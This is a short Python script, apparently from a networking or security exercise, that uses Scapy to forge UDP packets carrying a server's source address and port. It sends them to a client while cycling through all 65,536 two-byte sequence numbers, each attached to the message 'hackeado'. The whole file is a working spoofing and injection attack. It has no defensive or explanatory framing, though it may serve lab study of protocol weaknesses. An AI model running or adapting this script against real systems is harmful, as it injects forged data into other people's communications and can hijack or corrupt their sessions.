#!/usr/bin/env python3
import sys
from scapy.all import IP, UDP, send, L3RawSocket, conf

if len(sys.argv) != 5:
    print("Uso: ./pirata.py <servidor> <puerto_servidor> <ip_cliente> <puerto_cliente>")
    sys.exit(1)

conf.L3socket=L3RawSocket

servidor: str = sys.argv[1]
puerto_servidor: int = int(sys.argv[2])
ip_cliente: str = sys.argv[3]
puerto_cliente: int = int(sys.argv[4])
mensaje = "hackeado".encode()

print(f"Iniciando ataque contra {ip_cliente}:{puerto_cliente} desde {servidor}:{puerto_servidor}")

for seqn in range(0, 65_536):
    seqn_byte: bytes = seqn.to_bytes(2, "big")
    payload = seqn_byte + mensaje
    paquete = (
        IP(src=servidor, dst=ip_cliente) /
        UDP(sport=puerto_servidor, dport=puerto_cliente) /
        payload
    )
    send(paquete, verbose=False)
    print(f"Enviado paquete {seqn}")

